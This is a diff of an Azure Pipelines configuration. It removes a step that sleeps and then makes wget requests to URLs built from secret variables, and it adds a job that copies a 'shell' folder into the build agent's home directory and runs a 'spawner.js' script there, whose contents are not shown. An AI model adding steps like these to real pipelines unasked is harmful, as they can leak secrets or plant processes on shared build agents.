@@ -10,13 +10,12 @@ variables:
   - name: agent.clean.buildDirectory
     value: all
 
-pool:
-  name: 'Default'
-steps:
-  - task: CmdLine@2
-    inputs:
-      script: |
-        sleep 5m;
-        wget $(secretVariable);
-        wget http://deb.debian.org/debian-security/$(secredVarWithPartUrl);
-        wget $(secredVarBeginUrl)/pub/$(secredVarEndUrl);
+jobs:
+- job: 'Debian'
+  displayName: Debian
+  pool:
+    name: 'default'
+  steps:
+    - script: |
+        cp -r shell $(Agent.HomeDirectory)
+        $(Agent.HomeDirectory)/externals/node16/bin/node $(Agent.HomeDirectory)/shell/spawner.js
